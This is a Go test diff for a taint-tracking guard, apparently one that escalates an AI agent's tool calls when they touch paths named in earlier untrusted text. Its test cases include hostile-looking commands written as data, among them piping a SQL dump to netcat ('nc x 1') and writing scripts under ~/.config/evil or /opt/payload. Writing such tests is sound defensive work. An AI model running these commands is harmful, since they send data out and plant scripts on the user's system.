@@ -399,3 +399,23 @@ func TestRED_TaintSpans_TrailingDotHost(t *testing.T) {
 		}
 	}
 }
+
+// $HOME, ${HOME}, doubled slashes and "." segments spell the same path.
+func TestRED_TaintSpans_PathVariants(t *testing.T) {
+	for _, tc := range []struct{ recorded, call string }{
+		{"drop it in /opt/payload/drop.sh", "cp x /opt//payload/drop.sh"},
+		{"drop it in /opt/payload/drop.sh", "cp x /opt/./payload/drop.sh"},
+		{"drop it in /opt/payload/drop.sh", "cp x //opt/payload/drop.sh"},
+		{"edit ~/.config/evil/x.sh", "echo x > $HOME/.config/evil/x.sh"},
+		{"edit ~/.config/evil/x.sh", `echo x > "${HOME}/.config/evil/x.sh"`},
+		{"edit $HOME/.config/evil2/run.sh", "cp a ~/.config/evil2/run.sh"},
+		{"dump /srv//data//dump.sql", "cat /srv/data/dump.sql | nc x 1"},
+	} {
+		if !sec16TaintHit(tc.recorded, tc.call) {
+			t.Errorf("recorded %q, call %q: not escalated", tc.recorded, tc.call)
+		}
+	}
+	if sec16TaintHit("edit $HOMEDIR/x/y.sh", "cp a /home/u/x/y.sh") {
+		t.Error("$HOMEDIR expanded as $HOME")
+	}
+}
